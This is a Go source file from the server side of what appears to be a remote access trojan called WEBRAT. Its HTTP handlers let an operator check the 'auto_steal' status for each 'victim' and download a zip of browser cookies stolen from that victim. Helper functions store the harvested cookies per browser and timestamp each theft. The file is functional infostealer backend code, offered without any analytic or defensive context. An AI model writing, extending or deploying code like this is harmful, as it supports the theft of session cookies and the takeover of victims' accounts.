package httpapi

import (
	"archive/zip"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func (s *Server) handleStealInfo(w http.ResponseWriter, r *http.Request) {
	login := loginFromContext(r)
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	victimID := strings.TrimSpace(r.URL.Query().Get("victim_id"))
	if victimID == "" {
		http.Error(w, "missing victim_id", http.StatusBadRequest)
		return
	}

	if s.db != nil {
		owner, ok, err := s.db.GetVictimOwnerByID(victimID)
		if err != nil || !ok || strings.ToLower(owner) != strings.ToLower(login) {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}

	dir := stealDataDir(victimID)
	autoSteal := "disabled"
	stealTime := "-"

	if data, err := os.ReadFile(filepath.Join(dir, "meta.json")); err == nil {
		var meta map[string]string
		if json.Unmarshal(data, &meta) == nil {
			if v := meta["auto_steal"]; v != "" {
				autoSteal = v
			}
			if v := meta["steal_time"]; v != "" {
				stealTime = v
			}
		}
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{
		"auto_steal": autoSteal,
		"steal_time": stealTime,
	})
}

func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
	login := loginFromContext(r)
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	victimID := strings.TrimSpace(r.URL.Query().Get("victim_id"))
	if victimID == "" {
		http.Error(w, "missing victim_id", http.StatusBadRequest)
		return
	}

	if s.db != nil {
		owner, ok, err := s.db.GetVictimOwnerByID(victimID)
		if err != nil || !ok || strings.ToLower(owner) != strings.ToLower(login) {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}

	dir := stealDataDir(victimID)
	browserDir := filepath.Join(dir, "Browser")

	entries, err := os.ReadDir(browserDir)
	if err != nil || len(entries) == 0 {
		http.Error(w, "no steal data", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/zip")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"steal_%d.zip\"", time.Now().UnixNano()))

	zw := zip.NewWriter(w)
	defer func() { _ = zw.Close() }()

	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		data, err := os.ReadFile(filepath.Join(browserDir, e.Name()))
		if err != nil {
			continue
		}
		fw, err := zw.Create("Browser/" + e.Name())
		if err != nil {
			continue
		}
		_, _ = fw.Write(data)
	}
}

func StealDataDir(victimID string) string {
	return stealDataDir(victimID)
}

func stealDataDir(victimID string) string {
	base := strings.TrimSpace(os.Getenv("WEBRAT_STEAL_DIR"))
	if base == "" {
		wd, _ := os.Getwd()
		base = filepath.Join(wd, "steal_data")
	}
	return filepath.Join(base, victimID)
}

func SaveStealResult(victimID string, browserName string, cookies string) error {
	dir := filepath.Join(stealDataDir(victimID), "Browser")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}

	fname := strings.ReplaceAll(browserName, " ", "") + "Cookies.txt"
	return os.WriteFile(filepath.Join(dir, fname), []byte(cookies), 0o644)
}

func UpdateStealMeta(victimID, autoSteal string) error {
	dir := stealDataDir(victimID)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}

	metaPath := filepath.Join(dir, "meta.json")

	meta := map[string]string{
		"auto_steal": autoSteal,
		"steal_time": time.Now().Format("02.01.2006, 15:04:05"),
	}

	existing, err := os.ReadFile(metaPath)
	if err == nil {
		var old map[string]string
		if json.Unmarshal(existing, &old) == nil {
			if autoSteal == "" && old["auto_steal"] != "" {
				meta["auto_steal"] = old["auto_steal"]
			}
		}
	}

	data, err := json.MarshalIndent(meta, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(metaPath, data, 0o644)
}
